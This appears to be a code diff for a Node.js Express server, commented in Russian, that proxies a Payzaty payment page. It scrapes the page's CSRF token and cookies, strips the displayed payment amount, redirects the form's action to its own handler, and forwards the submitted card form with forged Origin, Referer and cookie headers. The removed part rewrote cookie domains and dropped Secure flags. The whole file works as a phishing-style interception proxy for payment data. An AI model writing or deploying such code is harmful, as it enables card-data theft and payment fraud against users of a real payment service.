@@ -2,76 +2,48 @@ const express = require('express');
 const axios = require('axios');
 const cheerio = require('cheerio');
 const cookieParser = require('cookie-parser');
-const { createProxyMiddleware } = require('http-proxy-middleware');
 
 const app = express();
 app.use(cookieParser());
+app.use(express.urlencoded({ extended: true }));
 
-// Хранилище для токенов (в продакшене используйте Redis)
+// Хранилище для токенов
 const tokenStore = new Map();
 
-/**
- * Прокси для статических ресурсов Payzaty
- */
-app.use(
-  '/payzaty',
-  createProxyMiddleware({
-    target: 'https://www.payzaty.com',
-    changeOrigin: true,
-    pathRewrite: { '^/payzaty': '' },
-    cookieDomainRewrite: 'sgas-nlcb.onrender.com',
-    onProxyRes(proxyRes) {
-      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
-      if (proxyRes.headers['set-cookie']) {
-        proxyRes.headers['set-cookie'] = proxyRes.headers['set-cookie'].map((cookie) =>
-          cookie
-            .replace(/;\s*Secure/gi, '')
-            .replace(/;\s*SameSite=\w+/gi, '; SameSite=None')
-        );
-      }
-    },
-  })
-);
+// Глобальные настройки axios для работы с куками
+const axiosInstance = axios.create({
+  withCredentials: true,
+  headers: {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+  }
+});
 
 /**
- * Главный прокси-эндпоинт для платежной страницы
+ * Прокси-эндпоинт для загрузки платежной формы
  */
 app.get('/proxy-payzaty', async (req, res) => {
   try {
     const paymentUrl = 'https://www.payzaty.com/payment/pay/b30c92ee7a214814ad0bf43a72bf634e';
     
-    // 1. Получаем оригинальную страницу с токеном
-    const response = await axios.get(paymentUrl, {
-      withCredentials: true,
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-      }
-    });
-
-    // 2. Извлекаем токен из формы
+    // 1. Получаем оригинальную страницу с куками
+    const response = await axiosInstance.get(paymentUrl);
+    
+    // 2. Извлекаем токен из формы и куки из ответа
     const $ = cheerio.load(response.data);
     const token = $('input[name="__RequestVerificationToken"]').val();
+    const cookies = response.headers['set-cookie'];
     
-    // 3. Сохраняем токен в хранилище (привязываем к сессии)
+    // 3. Сохраняем токен и куки в хранилище
     const sessionId = req.cookies.sessionId || generateSessionId();
-    tokenStore.set(sessionId, token);
+    tokenStore.set(sessionId, { token, cookies });
     
     // 4. Модифицируем страницу
-    $('.amount').remove();
-    $('.pay-amount').remove();
+    $('.amount, .pay-amount').remove();
     
-    // 5. Переписываем все URL для работы через прокси
-    $('[href^="/"]').each((_, el) => {
-      $(el).attr('href', '/payzaty' + $(el).attr('href'));
-    });
-    $('[src^="/"]').each((_, el) => {
-      $(el).attr('src', '/payzaty' + $(el).attr('src'));
-    });
-    
-    // 6. Подменяем action формы на наш обработчик
+    // 5. Подменяем action формы на наш обработчик
     $('form').attr('action', '/handle-payment');
     
-    // 7. Устанавливаем куки для сессии
+    // 6. Устанавливаем куки сессии
     res.cookie('sessionId', sessionId, { 
       httpOnly: true, 
       sameSite: 'None', 
@@ -86,7 +58,7 @@ app.get('/proxy-payzaty', async (req, res) => {
 });
 
 /**
- * Обработчик POST-запросов платежной формы
+ * Обработчик POST-запросов
  */
 app.post('/handle-payment', async (req, res) => {
   try {
@@ -95,34 +67,35 @@ app.post('/handle-payment', async (req, res) => {
       return res.status(403).send('Invalid session');
     }
 
-    // 1. Получаем сохраненный токен
-    const token = tokenStore.get(sessionId);
+    // 1. Получаем сохраненные данные
+    const { token, cookies } = tokenStore.get(sessionId);
     
-    // 2. Формируем данные для Payzaty
+    // 2. Формируем заголовки с оригинальными куками
+    const headers = {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Cookie': cookies.join('; '),
+      'Origin': 'https://www.payzaty.com',
+      'Referer': 'https://www.payzaty.com/payment/pay/b30c92ee7a214814ad0bf43a72bf634e',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    };
+    
+    // 3. Формируем данные формы
     const formData = new URLSearchParams();
+    for (const key in req.body) {
+      formData.append(key, req.body[key]);
+    }
     formData.append('__RequestVerificationToken', token);
-    // Здесь должны быть все остальные поля формы
     
-    // 3. Отправляем запрос в Payzaty с оригинальными заголовками
-    const response = await axios.post(
+    // 4. Отправляем запрос в Payzaty
+    const response = await axiosInstance.post(
       'https://www.payzaty.com/payment/process',
       formData.toString(),
-      {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Cookie': `__RequestVerificationToken=${token}`,
-          'Origin': 'https://www.payzaty.com',
-          'Referer': 'https://www.payzaty.com/payment/pay/b30c92ee7a214814ad0bf43a72bf634e',
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-        },
-        maxRedirects: 0,
-        validateStatus: (status) => status >= 200 && status < 400
-      }
+      { headers }
     );
-
-    // 4. Перенаправляем пользователя на следующий этап
+    
+    // 5. Обрабатываем ответ
     if (response.headers.location) {
-      return res.redirect(`/payzaty${response.headers.location}`);
+      return res.redirect(response.headers.location);
     }
     
     res.send(response.data);
@@ -132,16 +105,10 @@ app.post('/handle-payment', async (req, res) => {
   }
 });
 
-/**
- * Вспомогательные функции
- */
 function generateSessionId() {
   return Math.random().toString(36).substring(2) + Date.now().toString(36);
 }
 
-/**
- * Запуск сервера
- */
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
